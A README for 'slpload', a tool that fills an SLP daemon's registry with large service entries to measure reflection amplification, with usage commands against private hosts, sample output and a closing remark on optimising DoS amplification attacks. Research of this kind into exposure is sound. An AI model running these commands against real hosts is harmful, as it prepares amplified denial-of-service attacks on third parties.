# SLPLOAD

Testtool for amplification factor of slpd daemon. 

## Usage

### Show all modes
With the -m? option you can list all supported modes.

```
./slpload.py -m?
Supported modes:

        one-shot - load one-time data into svc
        load-test - try to load as much data as possible to service and calc ampfactor
        check - check data in default registry
```

### Test the maximum size of remote slpd buffer
Load test until remote buffer is filled. The command sets the buffer fillup to 1250bytes, registered lifetime to 10000 seconds and a timeout of 2s. 

./slpload.py -T 10000 -s 1250 -t 2 -l 192.168.0.109 -m load-test

### Send one fillup request only, 512 bytes payload, 1 second timeout and 60 seconds registered lifetime
```
./slpload.py -T 60 -s 512 -t 1 -l 192.168.0.110 -m one-shot
[+] Preparing packet
[+] Sending packet Register V2...
[+] Registration accepted. 
[+] Loaded up with 579 bytes
```

### Check remote registered data

```
./slpload.py -l 192.168.0.110 -m check                    
[+] Sending service type  request v2...
[+] Data Buffer: 
b'\x02\n\x00\x02C\x00\x00\x00\x00\x00\x83\xf8\x00\x02en\x00\x00\x02/service:VMwareInfrastructure,service:wbem:https,slpLoadTest://alF4yQIL:31337/Y40iEypDw8zSKwZPg3tuyrjnpLrGkuYH1GQyDuQgQC4EEAYE8Nf5hKVufZkboVoxLZNxhPYUH4WAqbfqQyGpg4jVSfUR6HX3utbdZ7Vvhi5qs9fW7NyjrQqTZxjNK8pHY40iEypDw8zSKwZPg3tuyrjnpLrGkuYH1GQyDuQgQC4EEAYE8Nf5hKVufZkboVoxLZNxhPYUH4WAqbfqQyGpg4jVSfUR6HX3utbdZ7Vvhi5qs9fW7NyjrQqTZxjNK8pHY40iEypDw8zSKwZPg3tuyrjnpLrGkuYH1GQyDuQgQC4EEAYE8Nf5hKVufZkboVoxLZNxhPYUH4WAqbfqQyGpg4jVSfUR6HX3utbdZ7Vvhi5qs9fW7NyjrQqTZxjNK8pHY40iEypDw8zSKwZPg3tuyrjnpLrGkuYH1GQyDuQgQC4EEAYE8Nf5hKVufZkboVoxLZNxhPYUH4WAqbfqQyGpg4jVSfUR6HX3ut'
[!] Host: 192.168.0.110 Buffer Size: 579 Ampfactor: 19.96551724137931
```

## Outro

On some devices / SLP implementations, the daemon stops filling the buffer after a certain point and either maintains the size or reverts to some default value.
For a DoS amplification attack and in order to optimize the amplification to the maximum an attacker just has to adjust the payload size for the device he is populating. 

May the packets be with you.

# Author

Marco Lux
